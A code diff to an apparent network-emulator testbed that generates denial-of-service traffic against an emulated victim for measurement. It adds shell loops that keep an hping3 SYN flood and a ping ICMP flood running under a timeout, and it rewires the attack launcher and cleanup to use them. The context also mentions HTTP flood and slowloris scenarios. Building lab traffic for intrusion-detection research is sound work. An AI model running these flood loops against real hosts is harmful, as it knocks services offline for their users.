@@ -79,6 +79,29 @@ while true; do
   sleep %s
 done
 ''' % (victim, HTTP_FLOOD_PAUSE))
+    # SYN e ICMP envueltos en un bucle con timeout: si el generador se cuelga
+    # o muere, timeout lo mata a los 5 s y el bucle lo relanza, asi el flood
+    # se sostiene toda la medicion.
+    #
+    # SYN: hping3 (manda SYN crudos a :80).
+    # ICMP: ping del kernel, NO hping3. hping3 --icmp en OVS userspace manda
+    # la rafaga inicial y luego su socket raw deja de empujar paquetes (el
+    # contador del flujo se congela a los ~9 s). El ping del kernel sostiene
+    # el ritmo toda la corrida. El intervalo sale de ICMP_PPS (acotado para
+    # no tumbar el emulador).
+    icmp_interval = max(0.02, 1.0 / max(ICMP_PPS, 1))
+    _write_script('/tmp/synfloodloop.sh', '''#!/bin/sh
+while true; do
+  : synflood
+  timeout 5 hping3 -S -p 80 %s %s >/dev/null 2>&1
+done
+''' % (_hping_flag(SYN_PPS), victim))
+    _write_script('/tmp/icmpfloodloop.sh', '''#!/bin/sh
+while true; do
+  : icmpflood
+  timeout 5 ping -i %s -q %s >/dev/null 2>&1
+done
+''' % (icmp_interval, victim))
 
 
 def _hping_flag(pps):
@@ -91,10 +114,7 @@ def start_browse(host):
 
 def start_attack(host, scenario, victim, duration):
     if scenario == 'synflood':
-        host.cmd(
-            'hping3 -S -p 80 %s %s > /tmp/%s.attack.log 2>&1 &'
-            % (_hping_flag(SYN_PPS), victim, host.name)
-        )
+        host.cmd('sh /tmp/synfloodloop.sh > /tmp/%s.attack.log 2>&1 &' % host.name)
     elif scenario == 'httpflood':
         # Un solo curl por PC no llena el cupo: cada una abre varios a la vez.
         for worker in range(HTTP_FLOOD_WORKERS):
@@ -109,15 +129,14 @@ def start_attack(host, scenario, victim, duration):
             % (SLOWLORIS_CONNS, victim, duration + 15, host.name)
         )
     elif scenario == 'icmpflood':
-        host.cmd(
-            'hping3 --icmp %s %s > /tmp/%s.attack.log 2>&1 &'
-            % (_hping_flag(ICMP_PPS), victim, host.name)
-        )
+        host.cmd('sh /tmp/icmpfloodloop.sh > /tmp/%s.attack.log 2>&1 &' % host.name)
 
 
 def stop_host(host):
     host.cmd('pkill -f browse.sh 2>/dev/null || true')
     host.cmd('pkill -f httpflood.sh 2>/dev/null || true')
+    host.cmd('pkill -f synfloodloop.sh 2>/dev/null || true')
+    host.cmd('pkill -f icmpfloodloop.sh 2>/dev/null || true')
     host.cmd('pkill -f hping3 2>/dev/null || true')
     host.cmd('pkill -f slowhttptest 2>/dev/null || true')
 
